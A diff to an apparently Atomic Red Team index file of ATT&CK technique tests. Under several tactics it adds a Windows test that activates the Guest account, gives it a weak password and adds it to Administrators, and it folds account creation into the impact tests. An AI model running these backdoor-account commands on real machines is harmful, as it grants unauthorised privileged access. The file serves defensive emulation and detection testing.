@@ -2357,7 +2357,24 @@ privilege-escalation:
       - Office 365
       - Azure AD
       - SaaS
-    atomic_tests: []
+      identifier: T1078.001
+    atomic_tests:
+    - name: Enable Guest account
+      auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+      description: After execution the Default Guest account will be enabled (Active)
+        and added to Administrators Group
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          net user guest /active:yes
+          net user guest Paswword123!
+          net localgroup administrators guest /add
+        cleanup_command: |-
+          net user guest /active:no
+          net localgroup administrators guest /delete
+        name: command_prompt
+        elevation_required: true
   T1078.002:
     technique:
       created: '2020-03-13T20:21:54.758Z'
@@ -10787,7 +10804,24 @@ persistence:
       - Office 365
       - Azure AD
       - SaaS
-    atomic_tests: []
+      identifier: T1078.001
+    atomic_tests:
+    - name: Enable Guest account
+      auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+      description: After execution the Default Guest account will be enabled (Active)
+        and added to Administrators Group
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          net user guest /active:yes
+          net user guest Paswword123!
+          net localgroup administrators guest /add
+        cleanup_command: |-
+          net user guest /active:no
+          net localgroup administrators guest /delete
+        name: command_prompt
+        elevation_required: true
   T1136.002:
     technique:
       created: '2020-01-28T14:05:17.825Z'
@@ -23175,7 +23209,24 @@ defense-evasion:
       - Office 365
       - Azure AD
       - SaaS
-    atomic_tests: []
+      identifier: T1078.001
+    atomic_tests:
+    - name: Enable Guest account
+      auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+      description: After execution the Default Guest account will be enabled (Active)
+        and added to Administrators Group
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          net user guest /active:yes
+          net user guest Paswword123!
+          net localgroup administrators guest /add
+        cleanup_command: |-
+          net user guest /active:no
+          net localgroup administrators guest /delete
+        name: command_prompt
+        elevation_required: true
   T1578.003:
     technique:
       external_references:
@@ -34991,20 +35042,10 @@ impact:
           description: New password for the specified account.
           type: string
           default: HuHuHUHoHo283283@dJD
-      dependencies:
-      - description: 'User account to change password of must exist (User: #{user_account})
-
-'
-        prereq_command: 'net user #{user_account}
-
-'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
-
-'
       executor:
-        command: 'net.exe user #{user_account} #{new_password}
-
-'
+        command: |
+          net user #{user_account} #{new_user_password} /add
+          net.exe user #{user_account} #{new_password}
         cleanup_command: 'net.exe user #{user_account} /delete >nul 2>&1
 
 '
@@ -35027,20 +35068,10 @@ impact:
           description: User account to be deleted.
           type: string
           default: AtomicUser
-      dependencies:
-      - description: 'User account to delete must exist (User: #{user_account})
-
-'
-        prereq_command: 'net user #{user_account}
-
-'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
-
-'
       executor:
-        command: 'net.exe user #{user_account} /delete
-
-'
+        command: |
+          net user #{user_account} #{new_user_password} /add
+          net.exe user #{user_account} /delete
         name: command_prompt
         elevation_required: true
     - name: Remove Account From Domain Admin Group
@@ -52082,7 +52113,24 @@ initial-access:
       - Office 365
       - Azure AD
       - SaaS
-    atomic_tests: []
+      identifier: T1078.001
+    atomic_tests:
+    - name: Enable Guest account
+      auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+      description: After execution the Default Guest account will be enabled (Active)
+        and added to Administrators Group
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          net user guest /active:yes
+          net user guest Paswword123!
+          net localgroup administrators guest /add
+        cleanup_command: |-
+          net user guest /active:no
+          net localgroup administrators guest /delete
+        name: command_prompt
+        elevation_required: true
   T1078.002:
     technique:
       created: '2020-03-13T20:21:54.758Z'
